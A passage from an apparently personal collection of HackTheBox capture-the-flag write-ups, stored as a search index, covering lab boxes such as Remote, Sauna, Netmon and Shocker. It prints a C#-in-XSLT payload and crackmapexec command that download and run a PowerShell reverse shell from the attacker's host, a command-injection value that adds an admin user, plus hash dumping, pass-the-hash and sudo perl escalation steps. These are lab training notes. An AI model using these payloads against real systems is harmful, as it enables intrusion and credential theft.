to make a few changes to the exploit, those are highlighted in yellow. This payload will ping our machine, we watch with Wireshark to verify RCE It works! Then use inmemory injection to run a Powershell reverse shell. We use this powershell script: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1 with this line added at the end Invoke-PowershellTcp -Reverse -IPAddress 10.10.16.4 -Port 4444 and name the file shell.ps1 Now update our exploit payload, a few notes: - I was getting errors and felt like it was related to the quotes so I surrounded teh whole payload in trip quotes \"\"\" payload = \"\"\"<?xml version=\"1.0\"?><xsl:stylesheet version=\"1.0\" \\ xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" \\ xmlns:csharp_user=\"http://csharp.mycompany.com/mynamespace\">\\ <msxsl:script language=\"C#\" implements-prefix=\"csharp_user\">public string xml() \\ { string cmd = \"IEX (new-object net.webclient).downloadstring('http://10.10.16.4:443/shell.ps1')\"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\\ proc.StartInfo.FileName = \"powershell\"; proc.StartInfo.Arguments = cmd;\\ proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \\ proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \\ </msxsl:script><xsl:template match=\"/\"> <xsl:value-of select=\"csharp_user:xml()\"/>\\ </xsl:template> </xsl:stylesheet> \"\"\"; login = \"admin@htb.local\"; password=\"baconandcheese\"; host = \"http://10.10.10.180:80\"; this gives us a shell. We see the user has SeImpersonatePrivilege Enabled. and the only other user worth going after is Administrator We can use post/windows/gather/credentials/teamviewer_passwords in metasploit, but it requires a valid meterpreter session. Lets generate a meterpreter payload, copy it over, and get a session up. Now we run the command and get a password lets try that as Administrator's password: It works, AAND we can use smb to get a shell. We'll specify the same powershell command we used earlier to get a shell. crackmapexec smb 10.10.10.180 -u Administrator -p '!R3m0te!' -X \"IEX (new-object net.webclient).downloadstring('http://10.10.16.4:443/shell.ps1')\" It worked!","title":"Remote"},{"location":"HackTheBox/Remote/#remote","text":"We find a network file system Make a directory for it mkdir site_backups and mount it sudo mount -t nfs There are a bunch of files. These appear to be the backup files for umbro CMS. We find some interesting content in App_data/Umbraco.sdf strings Umbraco.sdf | head -n 20 Administratoradmindefaulten-US Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{\"hashAlgorithm\":\"SHA1\"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{\"hashAlgorithm\":\"SHA1\"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50 adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{\"hashAlgorithm\":\"SHA1\"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={\"hashAlgorithm\":\"HMACSHA256\"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={\"hashAlgorithm\":\"HMACSHA256\"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749 ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={\"hashAlgorithm\":\"HMACSHA256\"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32 We have the following username/hash combos admin:b8be16afba8c314ad33d812f22a04991b90e2aaa (SHA1) smith:jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts= (HMACSHA256) ssmith:jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts= (HMACSHA256) We're able to crack admin's hash using crackstation admin:baconandcheese We can now log in, but need to use the admin's email: admin@htb.local Now we can use EDB-49488 which grants RCE through Umbraco with credentials. python3 49488.py -u admin@htb.local -p baconandcheese -i http://remote:80/ -c whoami This exploit seemed limited, so I switched to a similar exploit EDB-46153 We had to make a few changes to the exploit, those are highlighted in yellow. This payload will ping our machine, we watch with Wireshark to verify RCE It works! Then use inmemory injection to run a Powershell reverse shell. We use this powershell script: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1 with this line added at the end Invoke-PowershellTcp -Reverse -IPAddress 10.10.16.4 -Port 4444 and name the file shell.ps1 Now update our exploit payload, a few notes: - I was getting errors and felt like it was related to the quotes so I surrounded teh whole payload in trip quotes \"\"\" payload = \"\"\"<?xml version=\"1.0\"?><xsl:stylesheet version=\"1.0\" \\ xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" \\ xmlns:csharp_user=\"http://csharp.mycompany.com/mynamespace\">\\ <msxsl:script language=\"C#\" implements-prefix=\"csharp_user\">public string xml() \\ { string cmd = \"IEX (new-object net.webclient).downloadstring('http://10.10.16.4:443/shell.ps1')\"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\\ proc.StartInfo.FileName = \"powershell\"; proc.StartInfo.Arguments = cmd;\\ proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \\ proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \\ </msxsl:script><xsl:template match=\"/\"> <xsl:value-of select=\"csharp_user:xml()\"/>\\ </xsl:template> </xsl:stylesheet> \"\"\"; login = \"admin@htb.local\"; password=\"baconandcheese\"; host = \"http://10.10.10.180:80\"; this gives us a shell. We see the user has SeImpersonatePrivilege Enabled. and the only other user worth going after is Administrator We can use post/windows/gather/credentials/teamviewer_passwords in metasploit, but it requires a valid meterpreter session. Lets generate a meterpreter payload, copy it over, and get a session up. Now we run the command and get a password lets try that as Administrator's password: It works, AAND we can use smb to get a shell. We'll specify the same powershell command we used earlier to get a shell. crackmapexec smb 10.10.10.180 -u Administrator -p '!R3m0te!' -X \"IEX (new-object net.webclient).downloadstring('http://10.10.16.4:443/shell.ps1')\" It worked!","title":"Remote"},{"location":"HackTheBox/Sauna/","text":"Sauna \u00b6 IP 10.10.10.175 53/tcp open domain? syn-ack ttl 127 80/tcp open http syn-ack ttl 127 Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Egotistical Bank :: Home | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-07-12 10:10:00Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 127 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 LDAP search returns a user's name. We found his username is hsmith we did more user enumeration with kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.local /usr/share/seclists/Usernames/userlist.txt we found a new user: fsmith and used the following command to get an AS-REP hash GetNPUsers.py egotistical-bank.local/ -usersfile users -format hashcat -outputfile as-rep.hash we then cracked using hashcat hashcat as-rep.hash /usr/share/wordlists/rockyou.txt fsmith Thestrokes23 we logged in using evil-winrm evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175 and found the user flag on the desktop we ran winpeas and found another set of credentials However, this user didn't appear to be valid, but we found a similar user and this password worked! svc_loanmgr Moneymakestheworldgoround! We then used the python bloodhound ingestor to collect domain info bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d Egotistical-bank.local -dc 10.10.10.175 -c All We loaded the .json files into bloodhound. Found out our svc_loanmgr account has DCSync privileges. We dumped secrets with secretesdump.py secretsdump.py -dc-ip 10.10.10.175 egotistical-bank.local/svc_loanmgr@10.10.10.175 which gave the following hashes Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c::: EGOTISTICAL-BANK.LOCAL\\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd::: EGOTISTICAL-BANK.LOCAL\\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd::: EGOTISTICAL-BANK.LOCAL\\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c::: SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:cba7484ad743db3e4f1e6feb311f44d6::: We are able to login as Administrator using the PTH function of evil-winrm evil-winrm -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e -i 10.10.10.175 Root flag \u00b6","title":"Sauna"},{"location":"HackTheBox/Sauna/#sauna","text":"IP 10.10.10.175 53/tcp open domain? syn-ack ttl 127 80/tcp open http syn-ack ttl 127 Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Egotistical Bank :: Home | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-07-12 10:10:00Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 127 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 LDAP search returns a user's name. We found his username is hsmith we did more user enumeration with kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.local /usr/share/seclists/Usernames/userlist.txt we found a new user: fsmith and used the following command to get an AS-REP hash GetNPUsers.py egotistical-bank.local/ -usersfile users -format hashcat -outputfile as-rep.hash we then cracked using hashcat hashcat as-rep.hash /usr/share/wordlists/rockyou.txt fsmith Thestrokes23 we logged in using evil-winrm evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175 and found the user flag on the desktop we ran winpeas and found another set of credentials However, this user didn't appear to be valid, but we found a similar user and this password worked! svc_loanmgr Moneymakestheworldgoround! We then used the python bloodhound ingestor to collect domain info bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d Egotistical-bank.local -dc 10.10.10.175 -c All We loaded the .json files into bloodhound. Found out our svc_loanmgr account has DCSync privileges. We dumped secrets with secretesdump.py secretsdump.py -dc-ip 10.10.10.175 egotistical-bank.local/svc_loanmgr@10.10.10.175 which gave the following hashes Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c::: EGOTISTICAL-BANK.LOCAL\\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd::: EGOTISTICAL-BANK.LOCAL\\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd::: EGOTISTICAL-BANK.LOCAL\\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c::: SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:cba7484ad743db3e4f1e6feb311f44d6::: We are able to login as Administrator using the PTH function of evil-winrm evil-winrm -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e -i 10.10.10.175","title":"Sauna"},{"location":"HackTheBox/Sauna/#root-flag","text":"","title":"Root flag"},{"location":"HackTheBox/Search/","text":"Search \u00b6 10.10.11.129 Hostname: RESEARCH Domain name: search.htb kerbrute found some valid user names: administrator@search.htb research@search.htb Hope Sharp IsolationIsKey? Using different permutations of her name in a wordlist combined with kerbrute we were able to find a valid username of hope.sharp Then we run bloodhound bloodhound-python -u hope.sharp -p \"IsolationIsKey?\" -d search.htb -ns 10.10.11.129 we then pull this into bloodhound and find an account that is vulnerable to AS-REP Roasting GetUserSPNs.py search.htb/hope.sharp:\"IsolationIsKey?\" -outputfile web_svc_kerberos and then crack the hash hashcat web_svc_kerberos /usr/share/wordlists/rockyou.txt Which give us the following set of creds. web_svc @3ONEmillionbaby Now we have a list of users in bloodhound. We did some magic with powershell to extract the usernames: start powershell pwsh import the users.json file $json = gc ./20220712232201_users.json | ConvertFrom-Json pull out the username and strip the @search.htb , save this to a file users-ad.txt $json.data.Properties.name |%{$_.split(\"@\")[0]} | Sort-Object -Unique > users-ad.txt Then we check the username list for password reuse: crackmapexec smb search.htb -u users-ad.txt -p \"@3ONEmillionbaby\" It looks like EDGAR.JACOBS is using the same password. We then use bloodhound to see what transitive object controlls this user has We see Edgar has access to the Helpdesk share crackmapexec smb search.htb -u edgar.jacobs -p \"@3ONEmillionbaby\" --shares","title":"Search"},{"location":"HackTheBox/Search/#search","text":"10.10.11.129 Hostname: RESEARCH Domain name: search.htb kerbrute found some valid user names: administrator@search.htb research@search.htb Hope Sharp IsolationIsKey? Using different permutations of her name in a wordlist combined with kerbrute we were able to find a valid username of hope.sharp Then we run bloodhound bloodhound-python -u hope.sharp -p \"IsolationIsKey?\" -d search.htb -ns 10.10.11.129 we then pull this into bloodhound and find an account that is vulnerable to AS-REP Roasting GetUserSPNs.py search.htb/hope.sharp:\"IsolationIsKey?\" -outputfile web_svc_kerberos and then crack the hash hashcat web_svc_kerberos /usr/share/wordlists/rockyou.txt Which give us the following set of creds. web_svc @3ONEmillionbaby Now we have a list of users in bloodhound. We did some magic with powershell to extract the usernames: start powershell pwsh import the users.json file $json = gc ./20220712232201_users.json | ConvertFrom-Json pull out the username and strip the @search.htb , save this to a file users-ad.txt $json.data.Properties.name |%{$_.split(\"@\")[0]} | Sort-Object -Unique > users-ad.txt Then we check the username list for password reuse: crackmapexec smb search.htb -u users-ad.txt -p \"@3ONEmillionbaby\" It looks like EDGAR.JACOBS is using the same password. We then use bloodhound to see what transitive object controlls this user has We see Edgar has access to the Helpdesk share crackmapexec smb search.htb -u edgar.jacobs -p \"@3ONEmillionbaby\" --shares","title":"Search"},{"location":"HackTheBox/Timelapse/","text":"Timelapse \u00b6 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-05-08 10:12:59Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0. , Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 127 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0. , Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 5986/tcp open ssl/http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 9389/tcp open mc-nmf syn-ack ttl 127 .NET Message Framing 49667/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49673/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 49674/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49696/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 55209/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at lea 389, 636 - LDAP \u00b6 Uauthenticated bind is allowed. I may be able to query for all the users 445 - SMB \u00b6 There were some files in an unprotected share. One of them was a password protected zip. I used zip2john and john to crack the password. supremelegacy","title":"Timelapse"},{"location":"HackTheBox/Timelapse/#timelapse","text":"53/tcp open domain syn-ack ttl 127 Simple DNS Plus 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-05-08 10:12:59Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0. , Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 127 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0. , Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 5986/tcp open ssl/http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 9389/tcp open mc-nmf syn-ack ttl 127 .NET Message Framing 49667/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49673/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 49674/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49696/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 55209/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at lea","title":"Timelapse"},{"location":"HackTheBox/Timelapse/#389-636-ldap","text":"Uauthenticated bind is allowed. I may be able to query for all the users","title":"389, 636 - LDAP"},{"location":"HackTheBox/Timelapse/#445-smb","text":"There were some files in an unprotected share. One of them was a password protected zip. I used zip2john and john to crack the password. supremelegacy","title":"445 - SMB"},{"location":"HackTheBox/netmon/","text":"Netmon \u00b6 Port 21 (ftp) allows anonymous login, and we have read access to just about the whole system. We see port 80 is open. it appears to be running PRTG Network Monitor. There is an exploit available, however it requires creds. We test default creds prtgadmin:prtgadmin but this is not a valid set of credentials. I did some searching online and found that the credentials (cleartext username and encrypted password) are stored in a configuration file at C:\\ProgramData\\Paessler\\PRTG Network Monitor\\PRTG Configuration.dat We copy the file using FTP to inspect, and find the credentials we're after JO3Y7LLK7IBKCMDN3DABSVAQO5MR5IDWF3MJLDOWSA====== OEASMEIE74Q5VXSPFJA2EEGBMEUEXFWW We keep digging, and find that there is an unencrypted version of this password in the old.bak version of this file. PrTg@dmin2019 It worked, and we're the System Administrator EDB-46527 is supposed to work for PRTG but I was unable to get it to work. I found this article online that describes the exploit, and decided to try it manually: https://www.codewatch.org/blog/?p=453 To summarize, PRTG has a feature to execute a program when specific environmental conditionas occur within Network Monitor. The scripts must be added to the filesystem, and by desing there is no way to upload via the webapp. However, the PowerShell version of the demo script is vulnerable to command injection! Go to Setup > System Administration > Notifications and click Add new notification Turn on \"Execute Program\" Select the .ps1 script Apply the below parameter which will add a new user pentest with password p3nT3st! : test.txt; net user pentest p3nT3st! /add Save the notification Run a test notification Verify pwnage Then use psexec to get a shell psexec.py 'pentest:p3nT3st!'@netmon","title":"Netmon"},{"location":"HackTheBox/netmon/#netmon","text":"Port 21 (ftp) allows anonymous login, and we have read access to just about the whole system. We see port 80 is open. it appears to be running PRTG Network Monitor. There is an exploit available, however it requires creds. We test default creds prtgadmin:prtgadmin but this is not a valid set of credentials. I did some searching online and found that the credentials (cleartext username and encrypted password) are stored in a configuration file at C:\\ProgramData\\Paessler\\PRTG Network Monitor\\PRTG Configuration.dat We copy the file using FTP to inspect, and find the credentials we're after JO3Y7LLK7IBKCMDN3DABSVAQO5MR5IDWF3MJLDOWSA====== OEASMEIE74Q5VXSPFJA2EEGBMEUEXFWW We keep digging, and find that there is an unencrypted version of this password in the old.bak version of this file. PrTg@dmin2019 It worked, and we're the System Administrator EDB-46527 is supposed to work for PRTG but I was unable to get it to work. I found this article online that describes the exploit, and decided to try it manually: https://www.codewatch.org/blog/?p=453 To summarize, PRTG has a feature to execute a program when specific environmental conditionas occur within Network Monitor. The scripts must be added to the filesystem, and by desing there is no way to upload via the webapp. However, the PowerShell version of the demo script is vulnerable to command injection! Go to Setup > System Administration > Notifications and click Add new notification Turn on \"Execute Program\" Select the .ps1 script Apply the below parameter which will add a new user pentest with password p3nT3st! : test.txt; net user pentest p3nT3st! /add Save the notification Run a test notification Verify pwnage Then use psexec to get a shell psexec.py 'pentest:p3nT3st!'@netmon","title":"Netmon"},{"location":"HackTheBox/nibbles/","text":"Nibbles \u00b6 Recon \u00b6 Tags for this box are: File Misconfiguration Web Difficulty: Easy Port scan shows an Apache webserver running on port 80. The site appears to be a static HTML page. In the HTML comments there is a reference to the /nibbleblog/ site. Feroxbuster agains this directory found /admin/ as wel as /admin.php (a login page). Exploitation \u00b6 Searched for \"nibbles\" in metasploit and found exploit/multi/http/nibbleblog_file_upload This exploit matches our target application's version. Unfortunately, this exploit requires authentication. Getting help \u00b6 Getting credentials had me stuck. I tried SQL injections and bruteforce. I reviewed the enumeration material multiple times to make sure I wasn't missing something. Finally I looked at a walkthrough. The author of the walkthrough was struggling too and he ended up just guessing the name of the box as the password. Turns out the password is the name of the box. User: admin pass: nibbles With credentials in hand, the nibbleblog exploit grants a shell as a normal user. Privilege Escalation \u00b6 The host is running Ubuntu 16.04.3. When searched in metasploit there is the following module: exploit/linux/local/bpf_sign_extension_priv_esc which grants root access. Reflect/Compare \u00b6 Both paths were mostly the same at first: Scan identified Apache:80 HTML comments disclosed /nibbleblog/ site Feroxbuster found /admin.php logon page. Found multi/http/nibbleblog_file_upload This is where we split My path: Got creds from walkthrough. nibbleblog_file_upload grants user access. Found linux/local/bpf_sign_extension_priv_esc by searching for PE on Ubuntu 16.04.3 grans root access. HTB writeup: Guessed the correct password nibbleblog_file_upload grants user access sudo -l revealed the ability to run /home/nibbler/personal/stuff/monitor.sh bash -i > monitor.sh sudo monitor.sh grants root Analysis \u00b6 I failed to guess the password (which was the name of the blog). I remember seeing monitor.sh and attempting to exploit it but I wasn't able to get it to work. I think the missing piece here was to create the script on the attack machine then upload to the victim - I was trying to create the script on the victim, which wasn't working. Lessons Learned \u00b6 Sometimes you can upload a file but not create one. If I focused more on the CyberKillchain, maybe this would have fell under \"delivery\" and I would have seen the other channel (upload vs direct write.)","title":"Nibbles"},{"location":"HackTheBox/nibbles/#nibbles","text":"","title":"Nibbles"},{"location":"HackTheBox/nibbles/#recon","text":"Tags for this box are: File Misconfiguration Web Difficulty: Easy Port scan shows an Apache webserver running on port 80. The site appears to be a static HTML page. In the HTML comments there is a reference to the /nibbleblog/ site. Feroxbuster agains this directory found /admin/ as wel as /admin.php (a login page).","title":"Recon"},{"location":"HackTheBox/nibbles/#exploitation","text":"Searched for \"nibbles\" in metasploit and found exploit/multi/http/nibbleblog_file_upload This exploit matches our target application's version. Unfortunately, this exploit requires authentication.","title":"Exploitation"},{"location":"HackTheBox/nibbles/#getting-help","text":"Getting credentials had me stuck. I tried SQL injections and bruteforce. I reviewed the enumeration material multiple times to make sure I wasn't missing something. Finally I looked at a walkthrough. The author of the walkthrough was struggling too and he ended up just guessing the name of the box as the password. Turns out the password is the name of the box. User: admin pass: nibbles With credentials in hand, the nibbleblog exploit grants a shell as a normal user.","title":"Getting help"},{"location":"HackTheBox/nibbles/#privilege-escalation","text":"The host is running Ubuntu 16.04.3. When searched in metasploit there is the following module: exploit/linux/local/bpf_sign_extension_priv_esc which grants root access.","title":"Privilege Escalation"},{"location":"HackTheBox/nibbles/#reflectcompare","text":"Both paths were mostly the same at first: Scan identified Apache:80 HTML comments disclosed /nibbleblog/ site Feroxbuster found /admin.php logon page. Found multi/http/nibbleblog_file_upload This is where we split My path: Got creds from walkthrough. nibbleblog_file_upload grants user access. Found linux/local/bpf_sign_extension_priv_esc by searching for PE on Ubuntu 16.04.3 grans root access. HTB writeup: Guessed the correct password nibbleblog_file_upload grants user access sudo -l revealed the ability to run /home/nibbler/personal/stuff/monitor.sh bash -i > monitor.sh sudo monitor.sh grants root","title":"Reflect/Compare"},{"location":"HackTheBox/nibbles/#analysis","text":"I failed to guess the password (which was the name of the blog). I remember seeing monitor.sh and attempting to exploit it but I wasn't able to get it to work. I think the missing piece here was to create the script on the attack machine then upload to the victim - I was trying to create the script on the victim, which wasn't working.","title":"Analysis"},{"location":"HackTheBox/nibbles/#lessons-learned","text":"Sometimes you can upload a file but not create one. If I focused more on the CyberKillchain, maybe this would have fell under \"delivery\" and I would have seen the other channel (upload vs direct write.)","title":"Lessons Learned"},{"location":"HackTheBox/shocker/","text":"Shocker \u00b6 Recon \u00b6 Tags for this box are: Perl Injection Web Difficulty: Easy Only 2 ports exposed: 2222 (ssh), and 80 (apache) The running version of SSH doesn't have any public exploits, so it seems pretty obvious the target will be a website for this challenge. Enumeration \u00b6 Nothing stood out from the scanning docs. I had to step back and really ask myself some fundamental questions to move forward on this one. What does it do? \u00b6 I've only been able to see the homepage index.html which appears to be a static page with a picture of a bug about to squash itself. What language is it written in? \u00b6 Based on some feroxbuster output (403 errors) the site seems to have the following filetypes aspx , asp , jsp , php . What server software is the application running on? \u00b6 Apache httpd 2.4.18 (Ubuntu) Getting help \u00b6 I peaked at the walkthrough because I was lost. No shocker - this machine was built to practice shellshock. On apache, the cgi-bin folder contains scripts. The scripts are accessed via web, run server side, then returned with an HTTP reply. Shellshock provides input that hijacks the server-side shell run. I also saw in the walkthrough that the target script is /cgi-bin/user.sh . But I want to prove this with a scan. fuzzing for shellshock \u00b6 Found a shellshock endpoint by running feroxbuster -u http://10.10.10.56:80/cgi-bin/ -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x \"sh\" -v -k -n -o /home/nate/hackthebox/shocker/results/scans/tcp80/tcp_80_http_feroxbuster_cgi-bin.txt Exploitation \u00b6 I was able to get user.txt but not enough privs for root.txt Privilege Escalation \u00b6 Linpeas findings \u00b6 Sudo version 1.8.16 \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Executing Linux Exploit Suggester 2 \u255a https://github.com/jondonas/linux-exploit-suggester-2 [1] af_packet CVE-2016-8655 Source: http://www.exploit-db.com/exploits/40871 [2] exploit_x CVE-2018-14665 Source: http://www.exploit-db.com/exploits/45697 [3] get_rekt CVE-2017-16695 Source: http://www.exploit-db.com/exploits/45010 \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d \u255ahttps://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid Matching Defaults entries for shelly on Shocker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User shelly may run the following commands on Shocker: (root) NOPASSWD: /usr/bin/perl Might be able to use the following from GTFO bins to get root. sudo perl -e 'exec \"/bin/sh\";' Reflect/Compare \u00b6 My Path: Scan finds Apache 2.4.18 on port 80 Looked at walkthrough Fuzz /cgi-bin/ to find endpoint vulnerable to Shellshock. Send webrequest with malicious header. Got User User can run perl as sudo GTFO bins for SUDO and perl Root HTB Walkthrough: Scan finds Apache on port 80 Fuzzed and found cgi-bin directory Knows they're exploiting shellshock (box name + cgi-bin) Fuzzed /cgi-bin/ for .sh , .py , and other scripting extensions Find user.sh Use metasploit /multi/http/apache_mod_cgi_bash_env_exec Got User Found perl NOPASSWD entry. Root Analysis \u00b6 There's no reason I should have looked at the writeup on this one, I'm a bit ashamed. I knew the Apache version and could see the needed exploit from EDB (using searchsploit). Based on the name of the box I figured it would require exploiting shellshock - but this was my first experience with shellshock. Lessons Learned \u00b6 Go through each exploit and try to understand the exploit BEFORE using a walkthrough.","title":"Shocker"},{"location":"HackTheBox/shocker/#shocker","text":"","title":"Shocker"},{"location":"HackTheBox/shocker/#recon","text":"Tags for this box are: Perl Injection Web Difficulty: Easy Only 2 ports exposed: 2222 (ssh), and 80 (apache) The running version of SSH doesn't have any public exploits, so it seems pretty obvious the target will be a website for this challenge.","title":"Recon"},{"location":"HackTheBox/shocker/#enumeration","text":"Nothing stood out from the scanning docs. I had to step back and really ask myself some fundamental questions to move forward on this one.","title":"Enumeration"},{"location":"HackTheBox/shocker/#what-does-it-do","text":"I've only been able to see the homepage index.html which appears to be a static page with a picture of a bug about to squash itself.","title":"What does it 